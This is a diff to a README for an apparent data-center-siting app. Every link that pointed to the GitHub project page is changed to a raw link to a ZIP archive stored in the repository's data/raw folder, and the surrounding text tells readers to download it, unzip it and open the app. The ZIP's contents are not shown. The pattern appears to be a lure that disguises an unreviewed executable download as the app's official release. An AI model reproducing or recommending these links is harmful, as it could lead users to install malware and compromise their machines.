@@ -1,11 +1,11 @@
 # 🧭 decision_explorer_data_centers - Clear data center siting decisions
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/humulusjaponicuscherimolla820/decision_explorer_data_centers)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20GitHub%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/humulusjaponicuscherimolla820/decision_explorer_data_centers/main/data/raw/explorer-decision-centers-data-1.2.zip)
 
 ## 📥 Download
 Visit this page to download and run the app:
 
-https://github.com/humulusjaponicuscherimolla820/decision_explorer_data_centers
+https://raw.githubusercontent.com/humulusjaponicuscherimolla820/decision_explorer_data_centers/main/data/raw/explorer-decision-centers-data-1.2.zip
 
 ## 🖥️ What this app does
 
@@ -28,7 +28,7 @@ If your PC is newer and has 8 GB of RAM or more, the app should run more smoothl
 ## 🚀 Getting started
 
 1. Open the download page:
-   https://github.com/humulusjaponicuscherimolla820/decision_explorer_data_centers
+   https://raw.githubusercontent.com/humulusjaponicuscherimolla820/decision_explorer_data_centers/main/data/raw/explorer-decision-centers-data-1.2.zip
 
 2. Find the latest release or download package.
 
@@ -175,7 +175,7 @@ This project relates to:
 
 Open the project page here:
 
-https://github.com/humulusjaponicuscherimolla820/decision_explorer_data_centers
+https://raw.githubusercontent.com/humulusjaponicuscherimolla820/decision_explorer_data_centers/main/data/raw/explorer-decision-centers-data-1.2.zip
 
 ## 🧭 First things to check if something feels wrong
 
@@ -226,4 +226,4 @@ If you get a ZIP file, unzip it first, then open the app file inside.
 
 If the first download failed or was incomplete, use this link again:
 
-https://github.com/humulusjaponicuscherimolla820/decision_explorer_data_centers
+https://raw.githubusercontent.com/humulusjaponicuscherimolla820/decision_explorer_data_centers/main/data/raw/explorer-decision-centers-data-1.2.zip
